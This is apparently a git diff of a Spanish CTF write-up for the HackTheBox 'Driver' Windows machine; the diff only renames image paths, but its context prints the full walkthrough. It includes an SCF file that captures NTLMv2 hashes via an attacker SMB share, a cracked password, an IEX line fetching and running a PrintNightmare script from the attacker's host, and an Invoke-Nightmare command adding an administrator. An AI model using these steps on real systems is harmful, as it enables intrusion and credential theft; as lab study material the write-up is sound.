@@ -6,7 +6,7 @@ date: 2023-08-15
 #toc_label: "Contenido"
 #toc_icon: "fire"
 header:
-  teaser: /assets/images/HackTheBox/Driver/Driver-icon.png
+  teaser: /assets/img/HackTheBox/Driver/Driver-icon.png
   teaser_home_page: true
   icon: /assets/images/hackthebox.webp
 categories:
@@ -18,7 +18,7 @@ tags:
 ---
 
 
-![](/assets/images/HackTheBox/Driver/init.png)
+![](/assets/img/HackTheBox/Driver/init.png)
 
 Hoy vamos a estar resolviendo la máquina **Drive** de la plataforma HackTheBox. Esta máquina es **Windows** y se enfoca en la explotación de impresoras.
 
@@ -44,7 +44,7 @@ ping -c 1 10.129.95.238
 
 Tenemos conectividad.
 
-![](/assets/images/HackTheBox/Driver/ping.png)
+![](/assets/img/HackTheBox/Driver/ping.png)
 
 -----------------------------
 
@@ -72,7 +72,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.95.238 -oG allPorts
 - `10.129.95.238`: Es la dirección IP del objetivo que se va a escanear.
 - `-oG allPorts`: Genera una salida en formato greppable (Grep) que se guarda en el archivo "allPorts".
 
-![](/assets/images/HackTheBox/Driver/nmap1.png)
+![](/assets/img/HackTheBox/Driver/nmap1.png)
 
 En relación a esos puertos, vamos a ejecutar una serie de scripts básicos de reconocimiento para obtener información sobre los servicios y versiones en los puertos abiertos.
 
@@ -85,7 +85,7 @@ nmap -p80,135,445,5985 -sCV 10.129.95.238 -oN targeted
 - `10.129.95.238`: Es la dirección IP del objetivo que se va a escanear.
 - `-oN targeted`: Guarda la salida del escaneo en un archivo llamado "targeted".
 
-![](/assets/images/HackTheBox/Driver/nmap2.png)
+![](/assets/img/HackTheBox/Driver/nmap2.png)
 
 -------------------------------
 
@@ -98,38 +98,38 @@ nmap -p80,135,445,5985 -sCV 10.129.95.238 -oN targeted
 ```
 smbclient -L 10.129.95.238 -N
 ```
-![](/assets/images/HackTheBox/Driver/smbclient.png)
+![](/assets/img/HackTheBox/Driver/smbclient.png)
 
 #### crackmapexec
 
 ```
 crackmapexec smb 10.129.95.238
 ```
-![](/assets/images/HackTheBox/Driver/cme.png)
+![](/assets/img/HackTheBox/Driver/cme.png)
 
 ### HTTP:80
 
 Vamos a echar un vistazo al sitio web que está funcionando en el puerto 80, pero parece que cuenta con autenticación básica de HTTP. En este caso, podemos intentar utilizar credenciales por defecto como `admin:admin`.
 
-![](/assets/images/HackTheBox/Driver/http1.png)
+![](/assets/img/HackTheBox/Driver/http1.png)
 
 El `username` y `password` son `admin:admin`
 
 Estamos dentro.
 
-![](/assets/images/HackTheBox/Driver/http2.png)
+![](/assets/img/HackTheBox/Driver/http2.png)
 
 Parece que estamos tratando con `MFP Firmware Update Center`, que aparentemente es una página para cargar `firmware` a través de un recurso compartido de SMB.
 
 Lo que destaca aquí es que menciona que `Our team will review the uploads`.
 
-![](/assets/images/HackTheBox/Driver/http3.png)
+![](/assets/img/HackTheBox/Driver/http3.png)
 
 Por lo tanto puede ser que los tiros vayan por un `SCF Malicious File`.
 
-![](/assets/images/HackTheBox/Driver/google.png)
+![](/assets/img/HackTheBox/Driver/google.png)
 
-![](/assets/images/HackTheBox/Driver/scf.png)
+![](/assets/img/HackTheBox/Driver/scf.png)
 
 Bueno vamos crear un archivo `SCF` 
 
@@ -142,7 +142,7 @@ IconFile=\\X.X.X.X\share\pentestlab.ico
 [Taskbar]
 Command=ToggleDesktop
 ```
-![](/assets/images/HackTheBox/Driver/scffile.png)
+![](/assets/img/HackTheBox/Driver/scffile.png)
 
 ## Impacket-smbserver
 
@@ -154,19 +154,19 @@ impacket-smbserver smbFolder $(pwd) -smb2support
 
 Lo dejamos corriendo
 
-![](/assets/images/HackTheBox/Driver/impacket.png)
+![](/assets/img/HackTheBox/Driver/impacket.png)
 
 Cargamos el archivo `pwned.scf`
 
-![](/assets/images/HackTheBox/Driver/upload.png)
+![](/assets/img/HackTheBox/Driver/upload.png)
 
-![](/assets/images/HackTheBox/Driver/submit.png)
+![](/assets/img/HackTheBox/Driver/submit.png)
 
 ## Capturar Hash
 
 Si subimos el archivo y está visitando el explorador de archivos mientras intenta cargar el icono, dado que el icono se cargará desde mi recurso compartido en la red, para la carga debe haber una autenticación a nivel de red. Por lo tanto, si esto es aplicable, deberíamos ver el `hash`.
 
-![](/assets/images/HackTheBox/Driver/hash.png)
+![](/assets/img/HackTheBox/Driver/hash.png)
 
 Hay un usuario `tony` que se ve que a estado tratando de visualizar el archivo, a cargado el icono y el icono se lo a cargado desde mi maquina
 
@@ -175,23 +175,23 @@ Bueno lo siguiente seria crackear el `hash`
 
 Vamos a utilizar `john` para crackear el hash NTLMv2
 
-![](/assets/images/HackTheBox/Driver/hash2.png)
+![](/assets/img/HackTheBox/Driver/hash2.png)
 
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
-![](/assets/images/HackTheBox/Driver/john.png)
+![](/assets/img/HackTheBox/Driver/john.png)
 
 ### user:password
 - tony : liltony
 
 `crackmapexec` me dice que son credenciales validas en SMB
 
-![](/assets/images/HackTheBox/Driver/cme2.png)
+![](/assets/img/HackTheBox/Driver/cme2.png)
 
 Recurda que esta el puerto 5985 por lo tanto checamos y nos dio un `pwn3d!`
 
-![](/assets/images/HackTheBox/Driver/cme3.png)
+![](/assets/img/HackTheBox/Driver/cme3.png)
 
 ### Evil-WinRM
 
@@ -201,17 +201,17 @@ Ahora mediante `evil-winrm` nos conectamos a la maquina
 evil-winrm -i 10.129.95.238 -u 'tony' -p 'liltony'
 ```
 
-![](/assets/images/HackTheBox/Driver/winrm.png)
+![](/assets/img/HackTheBox/Driver/winrm.png)
 
 ## User Flag
 
 Ahi tenemos la primer flag
 
-![](/assets/images/HackTheBox/Driver/evil1.png)
+![](/assets/img/HackTheBox/Driver/evil1.png)
 
 La idea ahora es buscar una manera de elevar privilegios
 
-![](/assets/images/HackTheBox/Driver/evil2.png)
+![](/assets/img/HackTheBox/Driver/evil2.png)
 
 ### WinPEASx64.exe
 
@@ -219,13 +219,13 @@ Lo que voy hacer ahora es lanzar la herramienta `WinPEASx64.exe` para que me enu
 
 https://github.com/carlospolop/PEASS-ng/releases/tag/20230813-dc8384b3
 
-![](/assets/images/HackTheBox/Driver/winpeas.png)
+![](/assets/img/HackTheBox/Driver/winpeas.png)
 
 Una vez me lo descargo lo que hago es pasarlo a la maquina victima
 
 Primero en la maquina windows hay que irnos al directorio `\temp` y despues ahi mismo hacer un `upload`
 
-![](/assets/images/HackTheBox/Driver/evil3.png)
+![](/assets/img/HackTheBox/Driver/evil3.png)
 
 Ejecutamos `winPEASx64.exe`
 
@@ -235,7 +235,7 @@ Ejecutamos `winPEASx64.exe`
 
 Este proceso Hace alusion a una vulnerabilidad reciente relacionado con impresoras
 
-![](/assets/images/HackTheBox/Driver/spoolsv.png)
+![](/assets/img/HackTheBox/Driver/spoolsv.png)
 
 -------------------------------------
 
@@ -243,15 +243,15 @@ Este proceso Hace alusion a una vulnerabilidad reciente relacionado con impresor
 
 Una busqueda en google:
 
-![](/assets/images/HackTheBox/Driver/LPE1.png)
+![](/assets/img/HackTheBox/Driver/LPE1.png)
 
 Alparecer lo que hace este script es que te crea un usuario a nivel de sistema
 
-![](/assets/images/HackTheBox/Driver/LPE2.png)
+![](/assets/img/HackTheBox/Driver/LPE2.png)
 
 Nos descargamos el script.ps1 con `wget`
 
-![](/assets/images/HackTheBox/Driver/wget.png)
+![](/assets/img/HackTheBox/Driver/wget.png)
 
 Creamos un servidor con python
 
@@ -259,7 +259,7 @@ Creamos un servidor con python
 python3 -m http.server 80
 ```
 
-![](/assets/images/HackTheBox/Driver/python.png)
+![](/assets/img/HackTheBox/Driver/python.png)
 
 Despues con la siguiente linea nos descargamos el script en la maquina windows y al mismo tiempo lo ejecutamos con la siguiente operatoria
 
@@ -267,7 +267,7 @@ Despues con la siguiente linea nos descargamos el script en la maquina windows y
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6/CVE-2021-1675.ps1')
 ```
 
-![](/assets/images/HackTheBox/Driver/LPE3.png)
+![](/assets/img/HackTheBox/Driver/LPE3.png)
 
 Ahora ejecutamos la siguiente linea con el nuevo user y password que le indiques
 
@@ -275,24 +275,24 @@ Ahora ejecutamos la siguiente linea con el nuevo user y password que le indiques
 Invoke-Nightmare -DriverName "Xerox" -NewUser "user" -NewPassword "password" 
 ```
 
-![](/assets/images/HackTheBox/Driver/LPE4.png)
+![](/assets/img/HackTheBox/Driver/LPE4.png)
 
 ```
 net user
 ```
 
-![](/assets/images/HackTheBox/Driver/LPE5.png)
+![](/assets/img/HackTheBox/Driver/LPE5.png)
 
-![](/assets/images/HackTheBox/Driver/LPE6.png)
+![](/assets/img/HackTheBox/Driver/LPE6.png)
 
 Ahora solo toca salir e ingresar por `evil-winrm` con el nuevo usuario que es administrador
 
-![](/assets/images/HackTheBox/Driver/evilwin.png)
+![](/assets/img/HackTheBox/Driver/evilwin.png)
 
-![](/assets/images/HackTheBox/Driver/evilwin2.png)
+![](/assets/img/HackTheBox/Driver/evilwin2.png)
 
 ## Root Flag
 
-![](/assets/images/HackTheBox/Driver/root.png)
+![](/assets/img/HackTheBox/Driver/root.png)
 
 # R00T3D
